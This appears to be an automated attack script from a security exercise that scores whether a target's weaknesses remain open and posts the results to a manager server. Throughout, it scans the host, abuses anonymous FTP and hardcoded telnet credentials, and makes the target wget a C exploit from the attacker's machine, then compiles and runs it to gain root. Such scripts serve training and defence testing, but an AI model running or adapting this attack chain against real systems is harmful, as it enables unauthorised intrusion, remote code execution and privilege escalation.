import sys
import os
import time
import socket
from ftplib import FTP  
from telnetlib import Telnet
from http.server import HTTPServer, SimpleHTTPRequestHandler
import subprocess
import requests
import json





if(len(sys.argv) != 3):
    print("Script takes 2 argument; IP address of host. to attack and the campaign managers ip")
    exit()

#############  SETUP  #############


os.system("rm capture.pcapng")
target_ip = sys.argv[1]
manager_ip = sys.argv[2]
own_ip = os.popen('ip addr show eth0 | grep "\<inet\>" | awk \'{ print $2 }\' | awk -F "/" \'{ print $1 }\'').read().strip()
print("Attacking "+target_ip+" from my own ip: "+own_ip)

requests.post("http://"+manager_ip+":8855/info",json={"error":"script running"})

# #############  NMAP  #############
os.system("nmap -sC -sV "+target_ip)
time.sleep(20)

#############  FTP  #############
try:
    ftp = FTP(target_ip)
    ftp.login()
    time.sleep(1)
    ftp.retrlines('LIST')
    time.sleep(2)
    ftplogin = True
except:
    ftplogin = False


try:
    with open('capture.pcapng', 'wb') as fp:
        ftp.retrbinary('RETR captasure.pcapng', fp.write)
        downloaded = True
except:
    downloaded = False

ftp.quit()

try:
    loginpossible = True
    with Telnet(target_ip, 23) as tn:
        print("sending login")
        tn.read_until(b"login: ")
        tn.write("emil".encode('ascii') + b"\n")
        time.sleep(1)
        print("sending pass")
        tn.read_until(b"Password: ")
        tn.write("iloveyou1".encode('ascii') + b"\n")
        time.sleep(1)
        try:
            subprocess.Popen(["python3","-m","http.server"])
        except:
            print("already spawned")
        print("sending cd /tmp")
        tn.write(b'cd /tmp \n')
        time.sleep(3)
        print("sending wget exploit")
        tn.write(b'wget http://'+own_ip.encode()+b':8000/exploit.c \n')
        print("sending gcc")
        time.sleep(1)
        tn.write(b'gcc exploit.c -o exploit\n')
        print("sending chmod")
        time.sleep(1)
        tn.write(b'chmod +x exploit\n')
        print("running exploit")
        time.sleep(1)
        tn.write(b'./exploit\n')
        print("grabbing result")
        time.sleep(1)
        tn.write(b'cat /tmp/result\n')
        print("exiting")
        time.sleep(1)
        tn.write(b'exit\n')
        tn.get_socket().shutdown(socket.SHUT_WR)
        lines = tn.read_all()
        tn.close()

        if b'Login incorrect' in lines:
            loginpossible = False
        else:
            loginpossible = True

        if b'\nroot\r' in lines:
            rooted = True
        else:
            rooted = False
except:
    loginpossible = False



#############  REPORTING  #############
toPost = {
    "ftp-login": [
        {"Ftp login possible":ftplogin},
        {"description":"True if anonymous ftp login still possible"},
        {"Score":10}
    ],
    "downloadable": [
        {"Downloading pcap file possible":downloaded},
        {"description":"True if you could still download the file off the ftp server"},
        {"Score":20}
    ],
    "telnetlogin": [
        {"Loggin in to telnet with weak creds possible":loginpossible},
        {"description":"True if you could still log in to telnet with weak creds"},
        {"Score":30}
    ],
    "rootable": [
        {"rooting of the machine due to kernel exploit possible":rooted},
        {"description":"True if an attacker can escalate to root by exploiting kernel"},
        {"Score":50}
    ]
}
requests.post("http://"+manager_ip+":8855/info",json=toPost)
